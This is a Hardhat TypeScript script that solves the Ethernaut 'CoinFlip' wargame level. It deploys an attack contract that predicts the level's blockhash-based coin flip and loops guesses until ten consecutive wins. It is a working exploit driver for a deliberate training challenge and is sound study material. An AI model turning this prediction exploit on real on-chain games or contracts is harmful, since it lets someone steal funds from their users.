import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackCoinFlip = async () => {
    // IF THIS FAIL BEFORE REACHING 10 WINS, JUST RERUN UNTIL IT DOES !!!
    // change contract addresses here.
    const coinFlipAddress = process.env.COINFLIP!; //type "await contract.address()" in ethernaut console
    const args: [] = [];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from it being predictable
    // additional read:
    // https://ethereum.org/en/developers/docs/blocks/
    // https://solidity-by-example.org/interface/

    // deploying attack contract here
    // const deployed = await deployContract(hre, "EternalKing", args);
    // alternative below
    console.log("Deploying attack contract AttackCoinFlip...");
    const attackContract = await (
        await ethers.getContractFactory("AttackCoinFlip", player)
    ).deploy();
    console.log(attackContract);
    console.log(`Contract deployed to ${attackContract.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (eternalKing.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }
    // typing all commands in console below
    // using coinflip contract from ethernaut
    const contract = await ethers.getContractAt("CoinFlip", coinFlipAddress);
    console.log("Checking consecutive wins, it should be zero...");
    let winsCheck = await contract.consecutiveWins();
    console.log(`Consecutive win is: ${winsCheck}`);
    console.log("Rigging game by predicting result with the attack contract...");
    // TODO: check for lastHash via blockhash and block.number
    while (winsCheck < 11) {
        const checkWin = await contract.consecutiveWins();
        console.log(`Current consecutiveWin is: ${checkWin}`);
        const tx = await attackContract.guess(coinFlipAddress);
        const txReceipt = await tx.wait(2);
        console.log("Transaction done, aiming for '10' wins...");
        winsCheck = await contract.consecutiveWins();
    }
    console.log("10 wins achieved, you may submit to ethernaut");
};

attackCoinFlip()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
